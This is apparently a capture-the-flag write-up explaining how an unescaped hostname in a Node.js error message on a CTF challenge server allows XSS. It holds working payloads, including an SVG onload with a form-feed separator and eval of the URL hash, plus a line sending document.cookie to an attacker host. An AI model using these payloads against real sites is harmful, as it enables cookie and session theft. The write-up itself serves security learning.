---
title: XSS 401 (Abusing URL parser)
author: 0xgodson
date: 2022-03-28
categories: [web]
tags: [xss]
---


# XSS 401 

<img src="https://i.imgur.com/5hAVBV2.png">

>## Note: The Node Version is 12.22.1

<br>

## Website:
<br>

<img src="https://i.imgur.com/7rFxDQU.png">

<br>

## Source Code Review:
>## server.js

```js
const express = require('express')
const puppeteer = require('puppeteer')
const escape = require('escape-html')

const app = express()
const port = 3000

app.use(express.static(__dirname + '/webapp'))

const visitUrl = async (url, cookieDomain) => {
    let browser =
            await puppeteer.launch({
                headless: true,
                pipe: true,
                dumpio: true,
                ignoreHTTPSErrors: true,
                args: [
                    '--incognito',
                    '--no-sandbox',
                    '--disable-gpu',
                    '--disable-software-rasterizer',
                    '--disable-dev-shm-usage',
                ]
            })

    try {
        const ctx = await browser.createIncognitoBrowserContext()
        const page = await ctx.newPage()

        try {
            await page.setCookie({
                name: 'flag',
                value: process.env.FLAG,
                domain: cookieDomain,
                httpOnly: false,
                samesite: 'strict'
            })
            await page.goto(url, { timeout: 6000, waitUntil: 'networkidle2' })
        } finally {
            await page.close()
            await ctx.close()
        }
    }
    finally {
        browser.close()
    }
}

app.get('/visit', async (req, res) => {
    const url = req.query.url
    console.log('received url: ', url)

    let parsedURL
    try {
        parsedURL = new URL(url)
    }
    catch (e) {
        res.send(escape(e.message))
        return
    }

    if (parsedURL.protocol !== 'http:' && parsedURL.protocol != 'https:') {
        res.send('Please provide a URL with the http or https protocol.')
        return
    }

    if (parsedURL.hostname !== req.hostname) {
        res.send(`Please provide a URL with a hostname of: ${escape(req.hostname)}, your parsed hostname was: escape(${parsedURL.hostname})`)
        return
    }

    try {
        console.log('visiting url: ', url)
        await visitUrl(url, req.hostname)
        res.send('Our admin bot has visited your URL!')
    } catch (e) {
        console.log('error visiting: ', url, ', ', e.message)
        res.send('Error visiting your URL: ' + escape(e.message))
    } finally {
        console.log('done visiting url: ', url)
    }

})

app.listen(port, async () => {
    console.log(`Listening on ${port}`)
})
```
This the a XSS chal, We need to find XSS to Steal Admin Cookies.

There is only one Functionality, We can Send URL to Admin Bot, Bot will Open the Link in Browser with Flag in Cookies. 

---

```js
    if (parsedURL.hostname !== req.hostname) {
        res.send(`Please provide a URL with a hostname of: ${escape(req.hostname)}, your parsed hostname was: escape(${parsedURL.hostname})`)
        return
    }
```
* escape Function Encode all the HTML tags. 

* parsedURL.hostname return the Hostname of the Provided URL. 

Ex:

```js
var url = 'https://google.com'
parsedURL = new URL(url)
console.log(parsedURL.hostname) 

Output:

google.com
```

* req.hostname is Just Host Header.
* We cannot Control req.hostname value, Bcoz the Chal was Hosted in google Cloud. So, if we Changed the Value, it gives 404

* Chal Description says: `Note: The Node Version is 12.22.1` 

After Some Research, I came Across a CVE(CVE-2021-22931)

<a href="https://nvd.nist.gov/vuln/detail/CVE-2021-22931">```missing input validation of host names returned by Domain Name Servers in Node.js dns library which can lead to output of wrong hostnames...```</a>

But, I cannot find any Public Exploits.

--- 

## HTML Injection Due to CVE-2021-22931

```js
 if (parsedURL.hostname !== req.hostname) {
        res.send(`Please provide a URL with a hostname of: ${escape(req.hostname)}, your parsed hostname was: escape(${parsedURL.hostname})`)
        return
    }
```

If You Look Closer, the ${parsedURL.hostname} is Not escaped. 

>## URL : 
```
https://wsc-2022-web-5-bvel4oasra-uc.a.run.app/visit?url=https://<h1>godson</h1>
```

<img src="https://i.imgur.com/nwsOzaO.png">

## Some RFC's for HostName:

* Should not contain space
* No matter, Upper case or Lower case, hostname will automatically converted to lowercase by the browser
* Here Some chars that Break the hostname 
    ```
    ? / \ # @ 
    ```

## Exploit IDEA:

* We need a Payload without space and the without the above chars. 
* UrlEncoding the `white space` doesn't work.
* Unicodes are Allowed in Hostnames
* We Need to find a Unicode Char that Act like a white space, So we can Use that unicode as space to Bypass the RFC rules.

## Harmless XSS:

* After 20 Min of Research, I came across a Blog with this payload. 

>`<svg%0Conload=alert()>`

<img src="https://i.imgur.com/iNsXZsf.png">

---

## Weaponizing XSS:

* So, Now We have a XSS. 
* My First Idea was to use btoa(base64) to Encode the Cookies and Redirect the Bot to attacker server with the Cookies are path. (`onload=window.location = 'http://attacker.com/?'+btoa(document.cookie)`)
* As i Mentioned Above, `Upper case or Lower case, hostname will automatically converted to lowercase by the browser`

* So, Now the the Encoded Base64 cookie will be automatically converted to Lower Case. Usually Base64 is a Mix of Both Upper and Lower Case letters

---
<br>

<img src="https://i.imgur.com/Mp5MX5A.png">

* If You Look Closer to The Above Image, the Payload is
`alert('AAABBBCCC')` . But the Browser Automatically Converted the upper case to lowercase. bcoz, THIS IS HOSTNAME. lol
---

* After 1 Hour, I realized, We can Write our Javascript Outside the Hostname and call the payload from Hostname. 

Ex:
```
https://https://wsc-2022-web-5-bvel4oasra-uc.a.run.app/visit?url=https://<svg%0Conload=eval(location.hash.slice(1))>#alert('AABBCCaabbcc')
```

* `location.hash.slice(1)` return the value after `#`
* `eval` is a Javascript Function to run the Javascript Code.

<img src="https://i.imgur.com/6WA3zKc.png">

* Now, Browser Doesn't Converted the Upper Case to Lowercase. 

## Flag:

```js
try {
            await page.setCookie({
                name: 'flag',
                value: process.env.FLAG,
                domain: cookieDomain,
                httpOnly: false,
                samesite: 'strict'
            })
```

From the Above Code, We know that, Flag is in the Admin Bot's Cookie

### Exploit: 

URL:

```
https://chal.link/visit?url=https://<svg%0Conload=eval(location.hash.slice(1))>/#window.location='https://attacker.com/?'+document.cookie
```

> Flag: wsc{wh0_kn3w_d0m41n_x55_w4s_4_th1n6}